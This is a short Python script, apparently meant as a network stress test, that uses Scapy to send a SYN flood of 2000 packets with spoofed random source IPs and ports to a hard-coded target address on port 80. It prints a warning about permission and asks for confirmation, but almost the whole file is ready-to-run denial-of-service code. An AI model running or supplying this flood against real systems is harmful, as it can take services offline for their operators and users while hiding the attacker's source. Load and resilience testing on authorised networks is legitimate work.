from scapy.all import send, sniff
from scapy.layers.inet import IP, TCP, UDP
import random
import time

# Configurationt
target_ip = "10.195.151.68"  # CHANGE THIS to your target IP
target_port = 80  # HTTP port
num_packets = 2000  # Total packets to send
packets_per_burst = 100  # Packets per burst
delay_between_bursts = 0.1  # Seconds between bursts

def generate_random_ip():
    """Generate a random IP address"""
    return ".".join(map(str, (random.randint(1, 254) for _ in range(4))))

def send_syn_flood():
    print(f"\nStarting SYN flood test to {target_ip}:{target_port}")
    print(f"Sending {num_packets} packets in bursts of {packets_per_burst}...\n")

    sent = 0
    try:
        while sent < num_packets:
            # Send a burst of packets
            for _ in range(packets_per_burst):
                src_ip = generate_random_ip()
                src_port = random.randint(1024, 65535)

                # Craft and send packet
                send(
                    IP(src=src_ip, dst=target_ip) /
                    TCP(sport=src_port, dport=target_port, flags="S"),
                    verbose=0
                )
                sent += 1

            # Print progress
            print(f"\rPackets sent: {sent}/{num_packets}", end="")
            time.sleep(delay_between_bursts)

    except KeyboardInterrupt:
        print("\nTest interrupted by user")
    except Exception as e:
        print(f"\nError occurred: {e}")

    print(f"\n\nTest complete. Total packets sent: {sent}")

if __name__ == "__main__":
    # Warning message
    print("=== SYN Flood Test Script ===")
    print("WARNING: Only run this on networks where you have permission!")
    print(f"Target: {target_ip}:{target_port}")

    # Confirm before proceeding
    confirm = input("Are you sure you want to continue? (y/n): ").lower()
    if confirm == 'y':
        send_syn_flood()
    else:
        print("Test cancelled")